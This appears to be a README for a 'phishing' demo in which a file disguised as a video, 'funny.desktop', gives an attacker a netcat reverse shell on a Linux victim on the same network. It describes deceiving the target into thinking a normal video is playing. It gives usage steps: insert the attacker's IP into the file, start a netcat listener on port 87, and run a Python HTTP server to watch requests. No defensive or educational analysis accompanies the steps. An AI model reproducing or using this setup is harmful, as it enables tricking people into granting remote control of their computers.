# phising-website
This is a demonstration of reverse shell using netcat which happens when the target on the same network plays the downloaded video.

## Description
- Using Netcat to gain revese shell access to the target's computer. 
- The target has to be in the same network for this to work.
- The target will think that he is playing a normal video but we will have access to his device.
- The target must be using Linux distro which has netcat installed on it.

## Usage
1. Open funny.desktop and replace {private_ip_address} with the attacker's private ip address.
2. Open terminal and run: ```sudo nc -lnvp 87``` Netcat will start listning at port 87.
3. Then run a python server to monitor all requests: ```sudo python3 -m http.server 80```
